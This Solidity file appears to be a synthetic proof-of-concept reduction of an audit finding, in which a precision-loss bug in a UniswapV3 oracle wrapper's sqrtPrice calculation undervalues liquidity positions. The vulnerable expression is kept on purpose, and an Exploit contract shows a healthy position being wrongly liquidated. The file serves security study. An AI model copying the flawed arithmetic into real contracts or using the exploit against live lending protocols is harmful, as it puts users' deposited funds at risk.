// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ParaSpace - [H-09] UniswapV3 tokens of certain pairs wrongly valued
    (Code4rena 2022-11-paraspace; #15982, reporter Trust)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: when token decimals match, sqrtPriceX96 is computed as
      sqrt(token0Price * 1e18 / token1Price) * 2^96 / 1e9
    The inner division truncates to 0 when token1Price > token0Price * 1e18,
    so getAmountsForLiquidity treats the position as all-token0 and under-values
    token1-heavy ranges → healthy positions look liquidatable.
    Vulnerable sqrtPrice expression preserved verbatim (@>). */

library SqrtLib {
    function sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/// @dev Minimal LiquidityAmounts.getAmountsForLiquidity branching on sqrtPrice.
library LiquidityAmounts {
    function getAmountsForLiquidity(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0, uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96) {
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);
        }
        if (sqrtRatioX96 <= sqrtRatioAX96) {
            // @> always taken when sqrtPriceX96 == 0 - treats position as pure amount0
            amount0 = uint256(liquidity); // simplified stand-in for getAmount0ForLiquidity
            amount1 = 0;
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            amount0 = uint256(liquidity) / 2;
            amount1 = uint256(liquidity) / 2;
        } else {
            amount0 = 0;
            amount1 = uint256(liquidity);
        }
    }
}

contract UniswapV3OracleWrapper {
    struct PairOracleData {
        uint256 token0Price; // USD 1e18
        uint256 token1Price;
        uint8 token0Decimal;
        uint8 token1Decimal;
        uint160 sqrtPriceX96;
    }

    struct PositionData {
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
    }

    /// @dev Reduced _getOracleData same-decimal branch + getTokenPrice valuation.
    function getTokenPrice(
        PairOracleData memory oracleData,
        PositionData memory positionData
    ) public pure returns (uint256) {
        if (oracleData.token1Decimal == oracleData.token0Decimal) {
            // multiply by 10^18 then divide by 10^9 to preserve price in wei
            oracleData.sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(
                    ((oracleData.token0Price * (10 ** 18)) / (oracleData.token1Price)) // @> VULN: truncates to 0 when token1Price > token0Price*1e18
                ) * 2 ** 96) / 1e9
            );
            // FIX: multiply by 2**96 (or scale) BEFORE the division that can zero
        }

        // Use dummy tick bounds; with sqrtPrice 0 the amount branch is amount0-only.
        uint160 sa = 1; // > 0 so sqrtPrice 0 <= sa
        uint160 sb = 2;

        (uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts.getAmountsForLiquidity(
            oracleData.sqrtPriceX96, sa, sb, positionData.liquidity
        );

        return (((liquidityAmount0) * oracleData.token0Price) / 10 ** oracleData.token0Decimal)
            + (((liquidityAmount1) * oracleData.token1Price) / 10 ** oracleData.token1Decimal);
    }

    /// @dev Correct valuation assuming in-range mix (half/half of liquidity units).
    function getTokenPriceCorrect(
        PairOracleData memory oracleData,
        PositionData memory positionData
    ) public pure returns (uint256) {
        uint256 amount0 = uint256(positionData.liquidity) / 2;
        uint256 amount1 = uint256(positionData.liquidity) / 2;
        return (amount0 * oracleData.token0Price) / 10 ** oracleData.token0Decimal
            + (amount1 * oracleData.token1Price) / 10 ** oracleData.token1Decimal;
    }
}

/// @dev Lending health check that liquidates when oracle value < debt.
contract HealthCheck {
    UniswapV3OracleWrapper public oracle;
    uint256 public debt;
    bool public liquidated;

    constructor(UniswapV3OracleWrapper _o) {
        oracle = _o;
    }

    function setDebt(uint256 d) external {
        debt = d;
    }

    function tryLiquidate(
        UniswapV3OracleWrapper.PairOracleData memory od,
        UniswapV3OracleWrapper.PositionData memory pd
    ) external returns (bool) {
        uint256 value = oracle.getTokenPrice(od, pd);
        if (value < debt) {
            liquidated = true;
            return true;
        }
        return false;
    }
}

contract Exploit {
    UniswapV3OracleWrapper public wrapper; // CREATE 1 - vulnerable
    HealthCheck public health; // CREATE 2

    uint256 public buggyValue;
    uint256 public correctValue;
    bool public wronglyLiquidated;

    constructor() {
        wrapper = new UniswapV3OracleWrapper();
        health = new HealthCheck(wrapper);
    }

    function run() external {
        // WETH-like token0 at $1000, meme token1 at $0.00000068 but we use extreme
        // ratio: token0Price * 1e18 < token1Price so inner div is 0.
        // Example from report: token0Price small, token1Price huge in 1e18 units.
        // token0Price = 1e18 ($1), token1Price = 1e18 * 1e18 + 1 → ratio < 1 after *1e18? 
        // Condition: token1Price > token0Price * 10**18
        // token0Price = 1e18, token1Price = 1e18 * 1e18 + 1 = 1e36+1
        UniswapV3OracleWrapper.PairOracleData memory od = UniswapV3OracleWrapper.PairOracleData({
            token0Price: 1e18, // $1
            token1Price: 1e18 * 1e18 + 1, // >> token0 * 1e18
            token0Decimal: 18,
            token1Decimal: 18,
            sqrtPriceX96: 0
        });
        UniswapV3OracleWrapper.PositionData memory pd = UniswapV3OracleWrapper.PositionData({
            tickLower: -1000,
            tickUpper: 1000,
            liquidity: 1_000_000 ether // large position
        });

        buggyValue = wrapper.getTokenPrice(od, pd);
        correctValue = wrapper.getTokenPriceCorrect(od, pd);

        // Buggy path: sqrt=0 → all amount0 → value ≈ liquidity * $1 / 1e18
        // Correct mid-range: half amount0 * $1 + half amount1 * huge price → enormous
        require(buggyValue < correctValue, "should undervalue");
        require(buggyValue * 1000 < correctValue, "severe undervaluation");

        // Debt between buggy and correct → false liquidation of a healthy position.
        health.setDebt(buggyValue + 1);
        require(correctValue > health.debt(), "position is actually healthy");
        require(health.tryLiquidate(od, pd), "liquidated under buggy oracle");
        wronglyLiquidated = health.liquidated();
        require(wronglyLiquidated, "harm: healthy UniV3 LP wrongly liquidatable");
    }
}
